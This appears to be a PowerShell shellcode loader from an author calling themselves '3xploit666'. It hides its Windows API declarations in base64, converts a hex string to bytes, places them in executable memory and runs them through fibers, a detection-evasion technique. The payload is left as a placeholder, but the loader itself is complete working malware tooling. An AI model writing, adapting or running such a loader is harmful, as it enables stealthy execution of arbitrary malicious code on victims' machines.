
# 3xploit666
# Execution Shellcode Fibers
# https://docs.microsoft.com/en-us/windows/win32/procthread/fibers


$APIB64= [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('IFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBWaXJ0dWFsQWxsb2MoSW50UHRyIGxwQWRkcmVzcywgdWludCBkd1NpemUsIHVpbnQgZmxBbGxvY2F0aW9uVHlwZSwgdWludCBmbFByb3RlY3QpOw0KICAgIA0KICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBDb252ZXJ0VGhyZWFkVG9GaWJlcigpOw0KICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBDcmVhdGVGaWJlcih1aW50IGR3U3RhY2tTaXplLCBJbnRQdHIgbHBTdGFydEFkZHJlc3MsIHVpbnQgbHBQYXJhbWV0ZXIpOw0KICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQ0KICAgIHB1YmxpYyBleHRlcm4gc3RhdGljIEludFB0ciBTd2l0Y2hUb0ZpYmVyKEludFB0ciBmaWJlckFkZHJlc3MpOw=='))

function ReturnShellcode {
    param($CODE)
    $CODE = $CODE -split '(..)' | ? { $_ }
    ForEach ($xdh in $CODE){
        [Convert]::ToInt32($xdh,16)
    }
}
$win32 = Add-Type -memberDefinition $APIB64 -Name "Win32" -namespace Win32Functions -passthru
$code = "E8....."


[Byte[]] $shellcode = ReturnShellcode $code

	


$Addr = $win32::VirtualAlloc(0,[Math]::Max($shellcode.Length,0x1000),0x3000,0x40)

[System.Runtime.InteropServices.Marshal]::Copy($shellcode,0,$Addr,$shellcode.Length)

$currentFiber = $win32::ConvertThreadToFiber()

$newfber = $win32::CreateFiber(0,$Addr,0)

$win32::SwitchToFiber($newfber)